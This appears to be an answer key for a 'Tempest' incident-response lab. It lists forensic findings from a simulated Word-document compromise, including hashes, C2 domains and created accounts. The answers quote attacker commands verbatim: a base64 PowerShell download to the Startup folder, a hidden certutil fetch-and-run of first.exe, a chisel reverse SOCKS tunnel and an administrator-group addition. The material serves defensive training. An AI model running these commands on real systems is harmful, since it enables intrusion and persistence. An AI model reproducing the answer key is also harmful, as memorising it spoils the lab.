T                                                                                    Tempest — Task-Wise Answers (Empise)

Task 3 — Preparation — Tools and Artifacts
• SHA256 of capture.pcapng: CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6
• SHA256 of sysmon.evtx: 665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F
• SHA256 of windows.evtx: D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60

Task 4 — Initial Access — Malicious Document
• Malicious document filename: free_magicules.doc
• Compromised user-machine: benimaru-tempest
• PID of Word process that opened the malicious document: 496
• IPv4 resolved by malicious domain: 167.71.199.191
• Base64 encoded string in malicious payload:

JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==


• CVE used by exploit: 2022-30190

Task 5 — Initial Access — Stage 2 Execution
• Full target path of payload:
C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.zip
• Executed command upon login:

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe


• SHA256 of downloaded malicious binary (stage2): CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D
• C2 domain & port used: resolvecyber.xyz:80

Task 6 — Initial Access — Malicious Document Traffic
• URL of malicious payload embedded in doc: http://phishteam.xyz/02dcf07/index.html

• Encoding in C2 connection: Base64
• Parameter used by C2 binary: q
• Specific C2 path used by binary: /9ab62b5
• HTTP method used: GET
• Programming language used (from user agent): nim

Task 7 — Discovery — Internal Reconnaissance
• Password found in sensitive file: infernotempest
• Listening port for remote shell: 5985
• Reverse socks proxy command:

C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks


• SHA256 of proxy binary: 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451
• Name of tool used for proxy (lowercase): chisel
• Service used for authentication: winrm

Task 8 — Privilege Escalation
• Name and SHA256 of escalation binary: spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D
• Name of tool used (lowercase): printspoofer
• Privilege exploited: SeImpersonatePrivilege
• Binary used for C2 after escalation: final.exe
• Port used by this C2 connection: 8080

Task 9 — Actions on Objective
• Accounts created (alphabetical): shion, shona
• Missing option that made initial account creation fail: /add
• Event ID for account creation: 4720
• Command to add account to local administrators:

net localgroup administrators /add shion


• Event ID for adding to a local group: 4732
• Persistence technique (service name): TempestUpdate2
